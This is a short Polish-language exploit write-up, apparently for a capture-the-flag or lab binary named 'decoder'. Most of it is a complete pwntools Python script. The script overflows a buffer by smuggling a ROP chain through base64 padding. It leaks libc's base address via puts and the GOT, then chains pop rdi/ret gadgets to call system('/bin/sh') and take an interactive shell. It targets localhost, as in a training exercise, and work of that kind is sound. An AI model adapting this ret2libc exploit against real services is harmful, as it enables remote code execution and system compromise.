# Writeup do Exploita - `decoder`

## Cel

Celem było wykorzystanie luki w programie `decoder` do przeprowadzenia ataku, który:
1. Wypisze adres bazowy `libc`.
2. Uruchomi powłokę `/bin/sh`.

### 1. Wyciek adresu `libc`

Aby uzyskać adres bazowy `libc`, wykorzystano funkcję `puts()` oraz tablicę GOT (Global Offset Table).

### 2. Wykonanie powłoki `/bin/sh`

Po uzyskaniu adresu `libc` program obliczał adres funkcji `system()` i znajdował ciąg `/bin/sh`. Następnie skonstruowano łańcuch ROP, który:
- Umieszczał wskaźnik do `/bin/sh` w rejestrze `RDI`.
- Wykonywał instrukcję `ret`, aby przejść do wywołania funkcji `system()`.

## Kod Exploita

Oto szczegółowy kod exploita:

```python
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('../src/decoder')
libc = ELF('../src/lib/libc.so.6')

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 1337 
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import base64

io = start()

fill = b'A'*128  # Wypełnienie bufora

# Znalezienie adresów POP RDI i RET
POP_RDI = next(elf.search(asm("pop rdi; ret"), executable=True))
RET = next(elf.search(asm("ret"), executable=True))

# Pierwszy łańcuch ROP do wycieku adresu `libc`
ropchain = flat(
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['_start']
)

payload = base64.b64encode(fill)
payload += b'===='*7  # Dodanie separatorów
payload += base64.b64encode(b'AA'+ropchain)

io.clean()
io.sendline(payload)
io.recvuntil(b'bye')
io.recvline()

# Odczytanie i obliczenie adresu `libc`
puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

# Przygotowanie drugiego łańcucha ROP do wykonania `/bin/sh`
BINSH = next(libc.search(b'/bin/sh\x00'))

ropchain2 = flat(
    POP_RDI,
    BINSH,
    RET,
    libc.sym['system']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain2)

io.sendline(payload)

# Uzyskanie interaktywnej powłoki
io.interactive()
```